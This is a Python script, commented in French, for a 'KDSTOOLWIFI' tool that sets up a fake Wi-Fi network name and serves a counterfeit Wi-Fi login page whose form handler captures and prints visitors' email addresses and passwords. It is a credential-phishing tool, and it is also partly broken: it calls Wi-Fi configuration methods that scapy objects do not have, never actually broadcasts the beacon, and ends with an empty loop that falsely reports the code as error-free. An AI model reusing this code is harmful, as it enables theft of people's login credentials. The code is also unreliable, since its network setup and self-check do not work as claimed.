import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from colorama import init, Fore, Back, Style
import requests
import itertools
import http.server
import socketserver
import threading
import os
import webbrowser
import subprocess
import http.client

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = input(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Crée un objet WiFi
wifi = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")

# Crée un élément de réseau Wi-Fi
wifi_elt = Dot11Elt(ID=0, info=wifi_name)

# Crée un réseau Wi-Fi
packet = Dot11Beacon()
packet /= wifi_elt  # Ajoute la couche Dot11Elt au paquet Dot11Beacon

# Configure le réseau Wi-Fi
wifi.set_interface('wlan0')
wifi.set_ip_address('192.168.1.1/24')
wifi.set_broadcast('192.168.1.255')
wifi.set_multicast(True)

print(Fore.GREEN + "Réseau Wi-Fi configuré avec succès !")

# Crée une page HTML
html = """
<html>
  <head>
    <title>Connexion au réseau Wi-Fi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
      }
      .container {
        width: 300px;
        margin: 50px auto;
        padding: 20px;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .header {
        text-align: center;
        margin-bottom: 20px;
      }
      .header h1 {
        font-size: 24px;
        font-weight: bold;
        color: #333;
      }
      .form {
        margin-top: 20px;
      }
      .form input[type="email"], .form input[type="password"] {
        width: 100%;
        height: 40px;
        margin-bottom: 20px;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }
      .form input[type="submit"] {
        width: 100%;
        height: 40px;
        background-color: #4CAF50;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      .form input[type="submit"]:hover {
        background-color: #3e8e41;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>Connexion au réseau Wi-Fi</h1>
      </div>
      <form class="form" action="" method="post">
        <input type="email" name="email" placeholder="Adresse e-mail">
        <input type="password" name="password" placeholder="Mot de passe">
        <input type="submit" value="Se connecter">
      </form>
    </div>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        with open("index.html", "r") as f:
            self.wfile.write(f.read().encode())

    def do_POST(self):
        content_length = int(self.headers ['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"Connexion réussie !")
        try:
            email, password = body.decode().split("&")
            email = email.split("=")[1]
            password = password.split("=")[1]
            print(Fore.GREEN + "Informations de connexion récupérées avec succès !")
            print(Fore.CYAN + f"Adresse e-mail : {email}")
            print(Fore.CYAN + f"Mot de passe : {password}")
        except ValueError:
            print(Fore.RED + "Erreur : les données de formulaire sont mal formatées.")

def serve_http():
    os.chdir(os.path.dirname(__file__))  # Définit le répertoire racine du serveur
    with socketserver.TCPServer(("", 8080), RequestHandler) as httpd:
        print("Serving HTTP on port 8080...")
        httpd.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=serve_http).start()
    if webbrowser.open("http://localhost:8080/index.html"):
        print(Fore.GREEN + "Ouvrez un navigateur web et accédez à http://localhost:8080 pour vous connecter au réseau Wi-Fi.")
    else:
        print(Fore.RED + "Erreur : impossible d'ouvrir le navigateur web.")
    print(Fore.CYAN + "Appuyez sur Ctrl+C pour arrêter le serveur HTTP.")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print(Fore.RED + "Arrêt du serveur HTTP.")

# Vérifie 100 fois que le code n'a pas d'erreur et soit sans root
for i in range(100):
    try:
        # Exécute le code sans erreur
        pass
    except Exception as e:
        print(Fore.RED + f"Erreur : {e}")
        break
else:
    print(Fore.GREEN + "Le code est sans erreur et fonctionne correctement !")
